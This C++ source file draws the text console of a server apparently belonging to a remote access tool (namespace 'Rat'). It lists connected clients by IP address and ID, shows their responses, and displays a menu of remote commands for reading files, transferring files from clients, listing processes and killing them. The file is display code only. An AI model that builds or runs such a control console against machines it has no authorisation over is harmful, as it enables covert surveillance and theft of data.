#include "ServerGUI.hpp"




namespace Rat 
{
    ServerGUI::ServerGUI(){}

    ServerGUI::~ServerGUI(){}

    void ServerGUI::displayClients(const std::unordered_map<std::shared_ptr<SslSocket>, uint64_t>& clients)
    {
        std::cout << BOLD << BLUE << "+------------------------------------------+" << RESET << "\n";
        std::cout << BOLD << BLUE << "|          Connected Clients               |" << RESET << "\n";
        std::cout << BOLD << BLUE << "+------------------+-----------------------+" << RESET << "\n";
        std::cout << BOLD << "| IP Address       | Client ID             |" << RESET << "\n";
        std::cout << BOLD << BLUE << "+------------------+-----------------------+" << RESET << "\n";

        for (const auto& client : clients) {
            std::string ip = client.first->lowest_layer().remote_endpoint().address().to_string();
            std::cout << "| " << std::left << std::setw(16) << ip
                      << "| " << std::setw(21) << client.second << "|\n";
        }

        std::cout << BOLD << BLUE << "+------------------+-----------------------+" << RESET << "\n\n";
    }
    
    void ServerGUI::displayMenu() {
        std::cout << BOLD << YELLOW << "Available Commands:" << RESET << "\n";
        std::cout << GREEN << "  LIST_FILES <path>        : List files/folders in <path>" << RESET << "\n";
        std::cout << GREEN << "  READ_FILE <path>         : Read content of file at <path>" << RESET << "\n";
        std::cout << GREEN << "  TRANSFER_FILE <path>     : Transfer file from client" << RESET << "\n";
        std::cout << GREEN << "  LIST_PROCESSES           : List running processes" << RESET << "\n";
        std::cout << GREEN << "  KILL_PROCESS <pid>       : Kill process with <pid>" << RESET << "\n";
        std::cout << GREEN << "  EXIT                     : Stop server" << RESET << "\n";
        std::cout << BOLD << "Enter command: " << RESET;
    }

    void ServerGUI::displayResult(uint64_t client_id, const std::string& ip, const std::string& command, const std::string& result) {
        std::cout << BOLD << BLUE << "+-------------------------------------------------------------+" << RESET << "\n";
        std::cout << BOLD << BLUE << "| Response from Client ID: " << std::setw(10) << client_id << " IP: " << ip << " |" << RESET << "\n";
        std::cout << BOLD << BLUE << "+-------------------------------------------------------------+" << RESET << "\n";
        std::cout << BOLD << "Command: " << RESET << command << "\n";
        std::cout << BOLD << "Result: " << RESET << "\n";
        std::cout << result << "\n";
        std::cout << BOLD << BLUE << "+-------------------------------------------------------------+" << RESET << "\n\n";
    }

    void ServerGUI::displayError(const std::string& error) {
        std::cout << BOLD << RED << "Error: " << error << RESET << "\n\n";
    }

}